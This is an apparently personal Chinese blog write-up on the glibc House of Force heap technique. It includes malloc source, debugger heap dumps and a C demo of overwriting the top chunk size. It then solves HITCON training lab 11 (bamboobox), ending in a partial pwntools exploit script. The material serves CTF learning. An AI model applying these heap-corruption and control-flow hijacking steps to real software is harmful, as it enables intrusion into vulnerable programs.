<!doctype html>



  


<html class="theme-next muse use-motion">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">


  <meta name="keywords" content="堆学习,">





  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">






<meta name="description" content="House Of Force.我太弱了。">
<meta name="keywords" content="堆学习">
<meta property="og:type" content="article">
<meta property="og:title" content="House Of Force">
<meta property="og:url" content="http://yoursite.com/2020/04/29/House Of Force/index.html">
<meta property="og:site_name" content="mutou-jun&#39;s blog">
<meta property="og:description" content="House Of Force.我太弱了。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHD2aF.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHrtQ1.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHDgVU.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHDR54.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHD6bT.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHDyrV.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHDhG9.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHDfPJ.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/04/30/JHD42R.png">
<meta property="og:updated_time" content="2020-04-29T17:46:49.872Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="House Of Force">
<meta name="twitter:description" content="House Of Force.我太弱了。">
<meta name="twitter:image" content="https://s1.ax1x.com/2020/04/30/JHD2aF.png">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Muse',
    sidebar: {"position":"right","display":"always"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> House Of Force | mutou-jun's blog </title>
</head>



   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/src/fireworks.js"></script>


<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-right page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">mutou-jun's blog</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                House Of Force
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2020-04-29T23:46:37+08:00" content="2020-04-29">
              2020-04-29
            </time>
          </span>

          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>House Of Force.我太弱了。</p>
<a id="more"></a>
<h1 id="漏洞关键代码："><a href="#漏洞关键代码：" class="headerlink" title="漏洞关键代码："></a>漏洞关键代码：</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;          <span class="comment">//av代表arena, 这是获取当前的 top chunk </span></span><br><span class="line"><span class="built_in">size</span>  = chunksize(victim); <span class="comment">//获得当前 top chunk 的 size</span></span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;                          <span class="comment">//nb 代表用户申请的chunk 的size(经对齐处理后的)</span></span><br><span class="line">    remainder_size = <span class="built_in">size</span> - nb;<span class="comment">//剩余 top chunk的 size</span></span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);<span class="comment">//见本代码的最后一行 的define</span></span><br><span class="line">                                       即 top chunk和要分配出去的chunk的<span class="built_in">size</span>，</span><br><span class="line">                                         通过偏移的方式找到新的top chunk的位置。</span><br><span class="line">    av-&gt;top        = remainder;   <span class="comment">//于是 上面得到的地址  就成为 新的 top chunk的地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//下面 是对 新的  top chunk的chunk_head 做的处理</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">   </span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<h1 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h1><p>我们就看下 正常情况下的 分割 top chunk 的变化吧：<br>查看top chunk addr：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7dd1b78</span> <span class="string">&lt;main_arena+88&gt;:</span>	<span class="number">0x0000000000602020</span></span><br><span class="line"><span class="string">x/gx</span> <span class="number">0x7ffff7dd1b78</span>   <span class="string">//这里的</span>  <span class="number">0x7ffff7dd1b78</span> <span class="string">并不是固定的</span></span><br></pre></td></tr></table></figure>

<p>或者 直接 p main_arena    也是可以的</p>
<p>看这个例子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *ptr1,*ptr2;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);             <span class="comment">//执行完 这里 设为 A 处</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);             <span class="comment">//执行完 这里 设为 B 处</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -g force.c -o force</span></span><br></pre></td></tr></table></figure>

<p>执行完 这里 设为 A 处</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span></span><br><span class="line"><span class="number">0x602000</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">33</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x20fe1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x602020</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span>      <span class="string">//top</span> <span class="string">chunk's</span>  <span class="string">addr</span> <span class="string">is</span> <span class="number">0x602020</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">135137</span><span class="string">,</span>            <span class="string">//top</span> <span class="string">chunk's</span>  <span class="string">size</span> <span class="string">is</span> <span class="number">0x20fe1</span></span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>执行完 这里 设为 B 处<br>按最上面代码中的分析  可 推测  执行完 B 后</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new top chunk's  addr is <span class="number">0x602040</span> 即<span class="number">0x602020</span> + （<span class="number">0x10</span>+<span class="number">0x10</span>）  括号里 是经对齐</span><br><span class="line"> 后的  用户申请的chunk 大小。</span><br><span class="line">new top chunk's  size is <span class="number">0x20fc1</span>   即<span class="number">0x20fe1</span> - （<span class="number">0x10</span>+<span class="number">0x10</span>）</span><br></pre></td></tr></table></figure>

<p>验证  推测正确</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">heap</span></span><br><span class="line"><span class="number">0x602000</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">33</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x21</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x602020</span> <span class="string">FASTBIN</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">33</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x20fc1</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="number">0x602040</span> <span class="string">PREV_INUSE</span> <span class="string">&#123;</span>    <span class="string">//new</span> <span class="string">top</span> <span class="string">chunk's</span>  <span class="string">addr</span> <span class="string">is</span> <span class="number">0x602040</span></span><br><span class="line">  <span class="string">prev_size</span> <span class="string">=</span> <span class="number">0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">size</span> <span class="string">=</span> <span class="number">135105</span><span class="string">,</span>        <span class="string">//top</span> <span class="string">chunk's</span>  <span class="string">size</span> <span class="string">is</span> <span class="number">0x20fe1</span>          <span class="string">即</span>  <span class="number">135105</span></span><br><span class="line">  <span class="string">fd</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">fd_nextsize</span> <span class="string">=</span> <span class="number">0x0</span><span class="string">,</span> </span><br><span class="line">  <span class="string">bk_nextsize</span> <span class="string">=</span> <span class="number">0x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>看下面例子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">long</span> *)(((<span class="keyword">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//gcc -g force.c -o force</span></span><br></pre></td></tr></table></figure>

<p>目标是通过HOF来篡改   <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a>   实现劫持程序流程   即 修改 <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> 指向的  地址    ：比如为  system_addr</p>
<ol>
<li><a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a>    is         [0x601020]   <a href="mailto:malloc@GLIBC_2.2.5" target="_blank" rel="noopener">malloc@GLIBC_2.2.5</a> -&gt; 0x7ffff7a91130 (malloc)</li>
<li>为了 绕过  top chunk size &gt; nb + MINSIZE     将   top chunk size   设置  为 -1            即0xffffffff ffffffff</li>
<li>我们的 目的 首先是   申请到   含有 <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> 的地址 的chunk。 注意  申请成功后   返回的  时 申请到的 chunk_mem_addr    所以 我们 要申请的chunk的 addr 应该是 0x601020 -0x10 即   0x601010 </li>
<li>而 malloc 时   申请 的  chunk的addr  =       top chunk addr + nb的 size</li>
<li>我们就 看这个<br>top chunk addr ： 0x0000000000 602020  //用 x/10gx 0x7ffff7dd1b20 查看   &lt;main_arena+88&gt;对应的内容<br><a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> ： 0x0000000000 601020 </li>
</ol>
<p>由 黄色公式 可知   top chunk + nb的 size应该 为：  要申请的chunk的addr 0x601010 - top chunk addr 0x602020  = -0x1010  即 -4112    </p>
<p>这里的话 其实还有个  size 检测  </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>wiki.x10sec.org<span class="regexp">/pwn/</span>heap<span class="regexp">/house_of_force/</span><span class="comment">#_7</span></span><br></pre></td></tr></table></figure>

<p>这里 就记住   一般   再减  size_sz 就是 了   -4120</p>
<p>于是</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new top chunk's  addr is <span class="number">0x602040</span> 即<span class="number">0x602020</span> + （ <span class="number">-4120</span>+<span class="number">0x10</span>） ='<span class="number">0x601018</span>'   但却是 <span class="number">0x601010</span> （ 括号里 是经对齐 后的  用户申请的chunk 大小。）</span><br><span class="line">new top chunk's  size is <span class="number">0x20fc1</span>   即<span class="number">0x7fffffff</span> fffffff - （<span class="number">-4120</span> +<span class="number">0x10</span>）  =<span class="number">0x800000000001007</span> 但却是 <span class="number">0xffffffffffffeff1</span></span><br></pre></td></tr></table></figure>

<p>p main_arena<br><br><img src="https://s1.ax1x.com/2020/04/30/JHD2aF.png" alt="JHD2aF.png"></p>
<p>即 实现了  通过控制 top  chuk的size   控制malloc 的参数 去使得top chunk 的addr 指向  memaddr 是 malloc_got addr 的 chunk</p>
<p>上面是  将 top chunk addr 小 到  <a href="mailto:malloc@got.plt" target="_blank" rel="noopener">malloc@got.plt</a> -0x10   了</p>
<p>我们再来转到  __malloc_hook  -0x10  处                   </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//进程的__malloc_hook地址一定为<span class="number">0x7ffff7dd1b10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">malloc</span>  (参数)   参数  ：   (target_addr<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>) - top  chunk addr <span class="number">-0</span><span class="keyword">x</span><span class="number">10</span></span><br><span class="line"></span><br><span class="line">虽然  有些 没太明白，但 大概可以这一暂时先记着</span><br><span class="line">如果 要将top chunk addr变小 到 目标地址<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>      <span class="keyword">malloc</span> 参数 要是 负数         [ (target_addr<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>)-top chunk addr ] - <span class="number">0x10</span> +<span class="number">8</span></span><br><span class="line">如果 要将top chunk addr变大 到 目标地址<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>      <span class="keyword">malloc</span> 参数 要是 正数数      [ (target_addr<span class="number">-0</span><span class="keyword">x</span><span class="number">10</span>)-top chunk addr ] - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<hr>
<p>经过 初步的调试，发现 我们malloc 的参数 size    ：     new top chunk - old top chunk -0x10           就可以的！</p>
<h1 id="HITCON-training-lab-11"><a href="#HITCON-training-lab-11" class="headerlink" title="HITCON training lab 11"></a>HITCON training lab 11</h1><p>我们看下这个  很经典的 一题！<br>里面 有个 magic 函数 ，可以把同级目录下的 flag 文件中的内容 打印出来！</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">magic</span><span class="params">()</span>               <span class="comment">//0x400D49</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"./flag"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外在主函数 中我们可以看到 以下代码，因为我看了 源代码 可以很清楚的知道 这是个  含有两个函数指针的结构体!<br>我在看 时钟师傅的   博客时   发现  结构体（不仅这个）在他的ida 中都能 很好的 翻译的来！  而我的 仍然是 通过  数组及 偏移 呈现呢 !回头请教下！</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v3</span> = malloc(<span class="number">0</span>x10uLL)<span class="comment">;</span></span><br><span class="line">  *v3 = hello_message<span class="comment">;</span></span><br><span class="line">  v3[<span class="number">1</span>] = goodbye_message<span class="comment">;                      // struct box &#123;</span></span><br><span class="line">                                                //   void (*hello_message)()<span class="comment">;</span></span><br><span class="line">                                                //   void (*goodbye_message)()<span class="comment">;</span></span><br><span class="line">                                                // &#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>在程序 开始的 是由 执行了 这么一个  指令，要是  不通过在 跑一下程序  我都差点忽略它。</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((<span class="name">void</span> (<span class="name">__fastcall</span> *)(signed __int64, _QWORD))*v3)(<span class="number">16</span>LL, <span class="number">0</span>LL)<span class="comment">;   这个 其实 是 call goodbye_message指针</span></span><br><span class="line">对应 的汇编代码 下图：</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/JHrtQ1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/30/JHrtQ1.png" alt="JHrtQ1.png"></a></p>
<p>而 在程序要结束的时候 会发现   他会  call goodbye_message指针。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case <span class="number">5</span>:</span><br><span class="line">        ((void (__fastcall *)(char *, char *))v3[<span class="number">1</span>])(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>所以我们 可以通过 将 goodbye_message函数指针 给换成 magic () 函数指针。从而在结束 exit 的时候 pwn 掉程序。</p>
<p>程序的   change_item 函数存在 堆溢出 漏洞。 见下图。<br><img src="https://s1.ax1x.com/2020/04/30/JHDgVU.png" alt="JHDgVU.png"><br>我们的 目的：将 goodbye_message函数指针 给换成 magic () 函数指针</p>
<p>先malloc 一个 chunk            产生 top chunk<br>将  top chunk 的size    设置为  -1   即      0x ffffffff ffffffff<br> 计算 malloc 的参数 zise      使得 new top chunk =   下次 malloc我们 想要申请到的  malloc<br>然后 malooc 就申请到了 我们想要的 chunk</p>
<h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 